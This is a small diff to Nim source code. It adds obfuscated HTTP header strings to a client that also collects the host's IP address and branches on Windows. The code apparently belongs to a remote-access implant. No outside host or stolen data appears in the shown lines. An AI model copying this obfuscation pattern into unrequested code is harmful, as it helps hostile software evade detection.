@@ -18,6 +18,8 @@ const
     STATUS_INVALID*: int = 4
 
 let client: HttpClient = newHttpClient()
+client.headers = newHttpHeaders({obf("UserAgent"): USER_AGENT, obf("Content-Type"): obf("application/json")})
+
 let ip: string = $getPrimaryIPAddr()
 
 when defined(windows):
